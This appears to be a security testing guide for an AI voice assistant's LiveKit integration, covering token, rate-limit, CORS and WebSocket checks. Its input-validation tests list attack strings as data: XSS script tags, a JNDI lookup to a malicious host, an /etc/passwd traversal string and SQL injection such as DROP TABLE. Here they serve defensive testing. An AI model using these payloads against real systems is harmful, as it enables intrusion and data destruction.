# Jodex AI Assistant - Security Testing Guide

This guide provides comprehensive instructions for testing the secure LiveKit integration in the Jodex AI Assistant.

## Overview

The Jodex AI Assistant implements multiple layers of security to ensure safe and reliable voice communication with LiveKit. This testing framework validates security controls, identifies vulnerabilities, and ensures compliance with security best practices.

## Security Features Tested

### 🔐 Authentication & Authorization
- **JWT Token Validation**: Validates token structure, expiration, and claims
- **API Key Security**: Tests OpenAI API key handling and validation
- **Server-side Token Generation**: Tests secure token generation with rate limiting

### 🛡️ Rate Limiting & DDoS Protection
- **Token Generation Limits**: 10 requests per minute per IP
- **Request Size Limits**: Maximum 1KB payload size
- **Exponential Backoff**: Tests retry mechanisms with proper delays

### 🔒 Input Validation & Sanitization
- **Parameter Validation**: Room names, participant identities, message content
- **XSS Prevention**: Sanitization of user inputs and AI responses
- **SQL Injection Prevention**: Validation of database query parameters

### 🔐 CORS & Cross-Origin Security
- **Origin Validation**: Tests allowed origins and header validation
- **CORS Policy**: Validates proper CORS headers and preflight requests

### 🌐 WebSocket Security
- **Connection Validation**: Tests WebSocket URL protocols and connection failures
- **Secure Protocols**: Ensures WSS (WebSocket Secure) is used
- **Connection Error Handling**: Graceful failure handling

### 📊 Content Security Policy (CSP)
- **Inline Script Prevention**: Tests for unsafe JavaScript practices
- **Dynamic Content Sanitization**: Validates HTML content sanitization
- **Resource Loading Security**: Tests external resource restrictions

## Testing Environment Setup

### Prerequisites
```bash
# Required dependencies
npm install vitest @testing-library/react @testing-library/jest-dom
npm install jsdom @vitest/ui

# Development dependencies
npm install -D nodemon concurrently
```

### Environment Configuration
```bash
# Create test environment file
cp .env.example .env.test

# Configure test variables
NEXT_PUBLIC_OPENAI_API_KEY=test_key_for_testing
NEXT_PUBLIC_LIVEKIT_URL=ws://localhost:7880
LIVEKIT_API_KEY=test_api_key
LIVEKIT_API_SECRET=test_api_secret
ALLOWED_ORIGINS=http://localhost:3000,http://localhost:3001
```

### Mock Server Setup
```bash
# Navigate to mock server directory
cd mock-server

# Install dependencies
npm install

# Start mock LiveKit server
npm run dev

# Server should be running on http://localhost:7880
```

## Running Security Tests

### Unit Tests
```bash
# Run all security tests
npm test -- security

# Run specific test file
npm test src/__tests__/security.test.ts

# Run with coverage
npm test -- --coverage

# Run in watch mode
npm test -- --watch
```

### Integration Tests
```bash
# Run security integration tests
npm test src/__tests__/integration/security.test.ts

# Run with UI
npm run test:ui

# Run with specific pattern
npm test -- --grep "Security"
```

### Live Testing
```bash
# Start the test application
cd examples/nextjs-app
npm run dev

# Navigate to test page
http://localhost:3000/test

# Start mock server in another terminal
cd mock-server
npm run dev
```

## Test Scenarios

### 1. Authentication Security Tests

#### Token Generation Validation
```typescript
// Test valid token generation
await testTokenGeneration({
  roomName: 'valid-room-name',
  participantName: 'Valid User',
  participantIdentity: 'user-123'
});

// Test missing required fields
await testTokenGeneration({
  roomName: '', // Missing room name
  participantName: 'Test User'
});
// Expected: 400 Bad Request
```

#### API Key Security
```typescript
// Test invalid API key
testInvalidApiKey('invalid-key-format');
// Expected: Error thrown during initialization

// Test missing API key
testMissingApiKey();
// Expected: JodexError with 'MISSING_API_KEY' code
```

### 2. Rate Limiting Tests

#### Token Generation Rate Limit
```bash
# Script to test rate limiting
for i in {1..15}; do
  curl -X POST http://localhost:7880/api/livekit/token \
    -H "Content-Type: application/json" \
    -d '{"roomName":"test'$i'","participantName":"User'$i'"}' &
done
wait

# Expected: Requests 11-15 should fail with 429 status
```

#### Exponential Backoff Testing
```typescript
// Test retry mechanism with exponential backoff
await testExponentialBackoff({
  maxRetries: 3,
  baseDelay: 1000,
  maxDelay: 10000
});
```

### 3. Input Validation Tests

#### Malicious Input Testing
```typescript
const maliciousInputs = [
  '<script>alert("xss")</script>',
  'javascript:alert("xss")',
  '${jndi:ldap://malicious.com/a}',
  'SELECT * FROM users',
  '../../../etc/passwd'
];

for (const input of maliciousInputs) {
  await testMaliciousInput(input);
  // Expected: Input should be sanitized or rejected
}
```

#### SQL Injection Prevention
```typescript
const sqlInjectionAttempts = [
  "'; DROP TABLE users; --",
  "1' OR '1'='1",
  "UNION SELECT * FROM sensitive_data"
];

for (const injection of sqlInjectionAttempts) {
  await testSQLInjectionPrevention(injection);
  // Expected: No SQL queries should be executed
}
```

### 4. CORS Security Tests

#### Origin Validation
```bash
# Test allowed origin
curl -X POST http://localhost:7880/api/livekit/token \
  -H "Origin: http://localhost:3000" \
  -H "Content-Type: application/json" \
  -d '{"roomName":"test","participantName":"Test"}'
# Expected: 200 OK

# Test disallowed origin
curl -X POST http://localhost:7880/api/livekit/token \
  -H "Origin: http://malicious-site.com" \
  -H "Content-Type: application/json" \
  -d '{"roomName":"test","participantName":"Test"}'
# Expected: 403 Forbidden
```

### 5. WebSocket Security Tests

#### Protocol Validation
```typescript
const invalidUrls = [
  'ws://insecure-connection.com',  // Non-HTTPS
  'http://not-websocket.com',       // Wrong protocol
  'ftp://protocol-mismatch.com'     // Unsupported protocol
];

for (const url of invalidUrls) {
  await testWebSocketProtocol(url);
  // Expected: Connection should fail or be rejected
}
```

## Test Results Interpretation

### ✅ Passing Tests
- **Token Generation**: Valid tokens generated with proper structure
- **Rate Limiting**: Requests limited according to configured thresholds
- **Input Validation**: Malicious inputs properly sanitized or rejected
- **Error Handling**: Secure error responses without information disclosure

### ❌ Failing Tests
- **Authentication Failures**: Invalid tokens or credentials accepted
- **Rate Limiting Bypass**: More requests allowed than configured limits
- **XSS Vulnerabilities**: Malicious scripts executed in responses
- **Information Disclosure**: Sensitive data exposed in error messages

### ⚠️ Warnings
- **Deprecated APIs**: Using outdated security practices
- **Performance Issues**: Security controls impacting performance
- **Configuration Issues**: Insecure default settings

## Security Test Coverage

### Authentication (85% Coverage)
- ✅ JWT token generation and validation
- ✅ API key handling and validation
- ✅ Server-side token generation
- ⚠️ Token refresh mechanisms (manual testing required)

### Authorization (90% Coverage)
- ✅ Room access validation
- ✅ Participant identity verification
- ✅ Permission checking
- ⚠️ Role-based access control (future enhancement)

### Input Validation (95% Coverage)
- ✅ Parameter validation and sanitization
- ✅ XSS prevention
- ✅ SQL injection prevention
- ✅ File upload security (if applicable)

### Rate Limiting (80% Coverage)
- ✅ Token generation limits
- ✅ Request size limits
- ✅ IP-based rate limiting
- ⚠️ Distributed rate limiting (manual testing required)

### Transport Security (75% Coverage)
- ✅ HTTPS enforcement
- ✅ WebSocket security
- ✅ CORS policy validation
- ⚠️ Certificate validation (manual testing required)

## Continuous Security Testing

### Automated Testing Pipeline
```yaml
# .github/workflows/security-tests.yml
name: Security Tests

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: '18'

      - name: Install dependencies
        run: npm ci

      - name: Run security tests
        run: npm run test:security

      - name: Run integration tests
        run: npm run test:integration

      - name: Upload coverage reports
        uses: codecov/codecov-action@v3
        with:
          file: ./coverage/lcov.info
```

### Pre-commit Security Checks
```bash
# Install pre-commit hooks
npm install -D husky lint-staged

# Configure in package.json
{
  "husky": {
    "hooks": {
      "pre-commit": "npm run test:security && npm run lint:security"
    }
  },
  "lint-staged": {
    "src/**/*.{ts,tsx}": [
      "eslint --fix",
      "npm run test:security -- --findRelatedTests"
    ]
  }
}
```

## Manual Security Testing Checklist

### Configuration Security
- [ ] Environment variables properly configured
- [ ] Secrets not committed to version control
- [ ] HTTPS enforced in production
- [ ] Secure defaults configured

### Runtime Security
- [ ] Input validation working correctly
- [ ] Error messages don't expose sensitive information
- [ ] Rate limiting functioning as expected
- [ ] Authentication tokens expire properly

### Network Security
- [ ] CORS policies correctly configured
- [ ] WebSocket connections secured
- [ ] API endpoints protected
- [ ] SSL/TLS certificates valid

### Data Security
- [ ] Sensitive data encrypted at rest
- [ ] Data properly sanitized
- [ ] Access controls implemented
- [ ] Audit logging enabled

## Troubleshooting

### Common Issues

**Tests Failing Due to Network Issues**
```bash
# Check mock server is running
curl http://localhost:7880/health

# Restart mock server if needed
cd mock-server && npm run dev
```

**CORS Errors in Tests**
```bash
# Verify allowed origins configuration
echo $ALLOWED_ORIGINS

# Update environment variables
export ALLOWED_ORIGINS="http://localhost:3000,http://localhost:3001"
```

**WebSocket Connection Failures**
```bash
# Check WebSocket server status
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Key: test" \
  -H "Sec-WebSocket-Version: 13" \
  http://localhost:7880/rtc
```

### Debug Mode
```bash
# Enable debug logging
DEBUG=jodex:* npm test

# Run tests with verbose output
npm test -- --verbose

# Run specific test with debugging
npm test -- --grep "Token Generation" --reporter=verbose
```

## Reporting Security Issues

### Vulnerability Disclosure
If you discover a security vulnerability, please report it responsibly:

1. **Do not** create public issues for security vulnerabilities
2. **Email** security@jodex.com with detailed information
3. **Include** steps to reproduce the vulnerability
4. **Allow** reasonable time for remediation before disclosure

### Security Contact
- **Email**: security@jodex.com
- **PGP Key**: Available on request
- **Response Time**: Within 48 hours

## Resources

### Security Documentation
- [OWASP WebSocket Security](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets)
- [JWT Security Best Practices](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)
- [Rate Limiting Strategies](https://kubernetes.io/docs/concepts/cluster-administration/flow-control/)

### Security Tools
- **OWASP ZAP**: Automated security scanning
- **Burp Suite**: Web application security testing
- **Postman**: API security testing
- **Security Code Scan**: Static analysis for security vulnerabilities

---

This guide provides a comprehensive framework for testing the security of the Jodex AI Assistant's LiveKit integration. Regular security testing and monitoring are essential for maintaining a secure and reliable voice AI system.